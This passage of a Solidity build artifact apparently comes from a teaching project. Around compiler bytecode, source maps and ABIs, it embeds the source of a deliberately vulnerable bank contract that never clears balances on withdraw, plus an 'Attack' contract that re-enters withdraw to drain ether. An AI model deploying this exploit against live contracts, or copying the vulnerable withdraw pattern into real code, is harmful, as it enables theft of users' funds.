POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x1E2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x252 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x266 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2D3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x2F6 DUP2 PUSH2 0x3BF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x309 PUSH1 0xD DUP4 PUSH2 0x384 JUMP JUMPDEST SWAP2 POP PUSH2 0x314 DUP3 PUSH2 0x3F5 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x328 DUP2 PUSH2 0x3B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x343 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2ED JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x362 DUP2 PUSH2 0x2FC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x37E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x31F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3CA DUP3 PUSH2 0x3D1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3DC DUP3 PUSH2 0x3E3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3EE DUP3 PUSH2 0x395 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x6920676F74206E6F206964656100000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x7669702EA4A58D060ACB74CFF23915C6 SELFDESTRUCT 0xB7 0x4E 0xCA 0x2B TIMESTAMP SWAP5 SIGNEXTEND STATICCALL ISZERO 0x2A GASPRICE PUSH3 0x6B5C64 PUSH20 0x6F6C634300080700330000000000000000000000 ","sourceMap":"548:715:12:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;946:23;;;;;;;;;;:::i;:::-;;;;;;;;548:715;833:7;801:19;;;;;;;;;;793:36;;;:47;789:108;;856:19;;;;;;;;;;:28;;;:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;789:108;548:715;1164:97;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;570:46;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;982:176;;;:::i;:::-;;1164:97;1207:7;1233:21;1226:28;;1164:97;:::o;570:46::-;;;;;;;;;;;;:::o;982:176::-;1048:7;1035:9;:20;;1027:29;;;;;;1066:19;;;;;;;;;;:27;;;1101:7;1066:45;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1121:19;;;;;;;;;;:28;;;:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;982:176::o;7:187:15:-;122:65;181:5;122:65;:::i;:::-;117:3;110:78;7:187;;:::o;200:366::-;342:3;363:67;427:2;422:3;363:67;:::i;:::-;356:74;;439:93;528:3;439:93;:::i;:::-;557:2;552:3;548:12;541:19;;200:366;;;:::o;572:118::-;659:24;677:5;659:24;:::i;:::-;654:3;647:37;572:118;;:::o;696:278::-;817:4;855:2;844:9;840:18;832:26;;868:99;964:1;953:9;949:17;940:6;868:99;:::i;:::-;696:278;;;;:::o;980:419::-;1146:4;1184:2;1173:9;1169:18;1161:26;;1233:9;1227:4;1223:20;1219:1;1208:9;1204:17;1197:47;1261:131;1387:4;1261:131;:::i;:::-;1253:139;;980:419;;;:::o;1405:222::-;1498:4;1536:2;1525:9;1521:18;1513:26;;1549:71;1617:1;1606:9;1602:17;1593:6;1549:71;:::i;:::-;1405:222;;;;:::o;1633:169::-;1717:11;1751:6;1746:3;1739:19;1791:4;1786:3;1782:14;1767:29;;1633:169;;;;:::o;1808:126::-;1845:7;1885:42;1878:5;1874:54;1863:65;;1808:126;;;:::o;1940:77::-;1977:7;2006:5;1995:16;;1940:77;;;:::o;2023:154::-;2101:9;2134:37;2165:5;2134:37;:::i;:::-;2121:50;;2023:154;;;:::o;2183:126::-;2233:9;2266:37;2297:5;2266:37;:::i;:::-;2253:50;;2183:126;;;:::o;2315:113::-;2365:9;2398:24;2416:5;2398:24;:::i;:::-;2385:37;;2315:113;;;:::o;2434:163::-;2574:15;2570:1;2562:6;2558:14;2551:39;2434:163;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"221600","executionCost":"infinite","totalCost":"infinite"},"external":{"":"infinite","attack()":"infinite","getBalance()":"317","reentrantVulnerable()":"2597"}},"methodIdentifiers":{"attack()":"9e5faafc","getBalance()":"12065fe0","reentrantVulnerable()":"33684a05"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_reentrantVulnerable\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reentrantVulnerable\",\"outputs\":[{\"internalType\":\"contract ReentrantVulnerable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/sub/ReentrantVulnerable.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/sub/ReentrantVulnerable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.7;\\n\\ncontract ReentrantVulnerable {\\n    mapping(address => uint256) public balances;\\n\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    function withdraw() public {\\n        uint256 bal = balances[msg.sender];\\n        require(bal > 0);\\n        (bool sent, ) = msg.sender.call{value: bal}(\\\"\\\");\\n        require(sent, \\\"Failed to send ether \\\");\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\\ncontract Attack {\\n    ReentrantVulnerable public reentrantVulnerable;\\n\\n    constructor(address _reentrantVulnerable) {\\n        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);\\n    }\\n\\n    fallback() external payable {\\n        if (address(reentrantVulnerable).balance >= 1 ether) {\\n            reentrantVulnerable.withdraw();\\n        }\\n    }\\n\\n    receive() external payable {\\n        revert(\\\"i got no idea\\\");\\n    }\\n\\n    function attack() external payable {\\n        require(msg.value >= 1 ether);\\n        reentrantVulnerable.deposit{value: 1 ether}();\\n        reentrantVulnerable.withdraw();\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0x73197c33597719032434130163d3e9d1689ebbac2bdd3d632215faf32ddd78e9\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":3121,"contract":"contracts/sub/ReentrantVulnerable.sol:Attack","label":"reentrantVulnerable","offset":0,"slot":"0","type":"t_contract(ReentrantVulnerable)3118"}],"types":{"t_contract(ReentrantVulnerable)3118":{"encoding":"inplace","label":"contract ReentrantVulnerable","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}},"ReentrantVulnerable":{"abi":[{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"deposit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"608060405234801561001057600080fd5b50610486806100206000396000f3fe60806040526004361061003f5760003560e01c806312065fe01461004457806327e235e31461006f5780633ccfd60b146100ac578063d0e30db0146100c3575b600080fd5b34801561005057600080fd5b506100596100cd565b6040516100669190610310565b60405180910390f35b34801561007b57600080fd5b5061009660048036038101906100919190610259565b6100d5565b6040516100a39190610310565b60405180910390f35b3480156100b857600080fd5b506100c16100ed565b005b6100cb6101ed565b005b600047905090565b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490506000811161013d57600080fd5b60003373ffffffffffffffffffffffffffffffffffffffff1682604051610163906102db565b60006040518083038185875af1925050503d80600081146101a0576040519150601f19603f3d011682016040523d82523d6000602084013e6101a5565b606091505b50509050806101e9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101e0906102f0565b60405180910390fd5b5050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461023b9190610347565b92505081905550565b60008135905061025381610439565b92915050565b60006020828403121561026f5761026e610408565b5b600061027d84828501610244565b91505092915050565b6000610293601583610336565b915061029e8261040d565b602082019050919050565b60006102b660008361032b565b91506102c182610436565b600082019050919050565b6102d5816103cf565b82525050565b60006102e6826102a9565b9150819050919050565b6000602082019050818103600083015261030981610286565b9050919050565b600060208201905061032560008301846102cc565b92915050565b600081905092915050565b600082825260208201905092915050565b6000610352826103cf565b915061035d836103cf565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610392576103916103d9565b5b828201905092915050565b60006103a8826103af565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600080fd5b7f4661696c656420746f2073656e64206574686572200000000000000000000000600082015250565b50565b6104428161039d565b811461044d57600080fd5b5056fea264697066735822122053fef57e5312456af446ce256f26830c4e6abb69b9173533de926402bc8f9c3b64736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x486 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x6F JUMPI DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0xAC JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0xC3 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0xCD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x96 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x91 SWAP2 SWAP1 PUSH2 0x259 JUMP JUMPDEST PUSH2 0xD5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA3 SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC1 PUSH2 0xED JUMP JUMPDEST STOP JUMPDEST PUSH2 0xCB PUSH2 0x1ED JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x163 SWAP1 PUSH2 0x2DB JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1A0 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1A5 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1E9 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1E0 SWAP1 PUSH2 0x2F0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST CALLVALUE PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x23B SWAP2 SWAP1 PUSH2 0x347 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x253 DUP2 PUSH2 0x439 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x26F JUMPI PUSH2 0x26E PUSH2 0x408 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x27D DUP5 DUP3 DUP6 ADD PUSH2 0x244 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x293 PUSH1 0x15 DUP4 PUSH2 0x336 JUMP JUMPDEST SWAP2 POP PUSH2 0x29E DUP3 PUSH2 0x40D JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2B6 PUSH1 0x0 DUP4 PUSH2 0x32B JUMP JUMPDEST SWAP2 POP PUSH2 0x2C1 DUP3 PUSH2 0x436 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D5 DUP2 PUSH2 0x3CF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2E6 DUP3 PUSH2 0x2A9 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x309 DUP2 PUSH2 0x286 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x325 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x352 DUP3 PUSH2 0x3CF JUMP JUMPDEST SWAP2 POP PUSH2 0x35D DUP4 PUSH2 0x3CF JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x392 JUMPI PUSH2 0x391 PUSH2 0x3D9 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3A8 DUP3 PUSH2 0x3AF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x4661696C656420746F2073656E64206574686572200000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x442 DUP2 PUSH2 0x39D JUMP JUMPDEST DUP2 EQ PUSH2 0x44D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSTORE8 INVALID CREATE2 PUSH31 0x5312456AF446CE256F26830C4E6ABB69B9173533DE926402BC8F9C3B64736F PUSH13 0x63430008070033000000000000 ","sourceMap":"57:489:12:-:0;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@balances_3061":{"entryPoint":213,"id":3061,"parameterSlots":0,"returnSlots":0},"@deposit_3073":{"entryPoint":493,"id":3073,"parameterSlots":0,"returnSlots":0},"@getBalance_3117":{"entryPoint":205,"id":3117,"parameterSlots":0,"returnSlots":1},"@withdraw_3105":{"entryPoint":237,"id":3105,"parameterSlots":0,"returnSlots":0},"abi_decode_t_address":{"entryPoint":580,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address":{"entryPoint":601,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c_to_t_string_memory_ptr_fromStack":{"entryPoint":646,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":681,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":716,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed":{"entryPoint":731,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":752,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":784,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":811,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":822,"id":null,"parameterSlots":2,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":839,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":925,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":943,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":975,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x11":{"entryPoint":985,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":1032,"id":null,"parameterSlots":0,"returnSlots":0},"store_literal_in_memory_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c":{"entryPoint":1037,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470":{"entryPoint":1078,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_address":{"entryPoint":1081,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:4316:15","statements":[{"body":{"nodeType":"YulBlock","src":"59:87:15","statements":[{"nodeType":"YulAssignment","src":"69:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"91:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"78:12:15"},"nodeType":"YulFunctionCall","src":"78:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"69:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"134:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"107:26:15"},"nodeType":"YulFunctionCall","src":"107:33:15"},"nodeType":"YulExpressionStatement","src":"107:33:15"}]},"name":"abi_decode_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"37:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"45:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"53:5:15","type":""}],"src":"7:139:15"},{"body":{"nodeType":"YulBlock","src":"218:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"264:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"266:77:15"},"nodeType":"YulFunctionCall","src":"266:79:15"},"nodeType":"YulExpressionStatement","src":"266:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"239:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"248:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"235:3:15"},"nodeType":"YulFunctionCall","src":"235:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"260:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"231:3:15"},"nodeType":"YulFunctionCall","src":"231:32:15"},"nodeType":"YulIf","src":"228:119:15"},{"nodeType":"YulBlock","src":"357:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"372:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"386:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"376:6:15","type":""}]},{"nodeType":"YulAssignment","src":"401:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"436:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"447:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"432:3:15"},"nodeType":"YulFunctionCall","src":"432:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"456:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"411:20:15"},"nodeType":"YulFunctionCall","src":"411:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"401:6:15"}]}]}]},"name":"abi_decode_tuple_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"188:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"199:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"211:6:15","type":""}],"src":"152:329:15"},{"body":{"nodeType":"YulBlock","src":"633:220:15","statements":[{"nodeType":"YulAssignment","src":"643:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"709:3:15"}